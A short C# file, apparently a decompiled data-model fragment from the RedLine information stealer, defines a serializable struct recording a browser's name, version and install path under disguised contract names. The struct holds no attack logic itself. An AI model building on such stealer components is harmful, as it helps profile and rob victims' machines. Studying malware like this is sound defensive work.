using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "InstalledBrowserInfo")]
[DataContract(Name = "Entity4", Namespace = "Entity")]
public struct InstalledBrowserInfo
{
	[ProtoMember(1, Name = "Name")]
	[DataMember(Name = "Id1")]
	public string Name { get; set; }

	[ProtoMember(2, Name = "Version")]
	[DataMember(Name = "Id2")]
	public string Version { get; set; }

	[ProtoMember(3, Name = "Path")]
	[DataMember(Name = "Id3")]
	public string Path { get; set; }
}
